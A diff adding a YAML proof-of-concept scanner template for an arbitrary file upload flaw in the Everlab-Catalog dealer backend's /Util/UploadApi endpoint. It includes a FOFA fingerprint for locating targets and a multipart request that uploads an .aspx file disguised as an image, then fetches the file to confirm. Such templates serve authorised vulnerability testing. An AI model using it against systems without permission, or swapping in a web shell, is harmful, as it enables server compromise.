@@ -1,0 +1,33 @@
+id: poc-yaml-everlab-catalog-uploadapi-anyfile-upload
+info:
+  name: Everlab-Catalog经销商管理后台 UploadApi 文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: everlab
+  fofa: fid="eI+Xsoc7dLCgDaXFvOBCcg=="
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Util/UploadApi
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------111
+  data: '-----------------------------111
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    -----------------------------111--'
+  expression: status_code == 200 && contains(body,t1) && contains(headers,"json")
+  output:
+  - regex_match(body,`"Results":"/(?P<file>.*?)"`)
+- method: GET
+  path: /{{.file}}
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
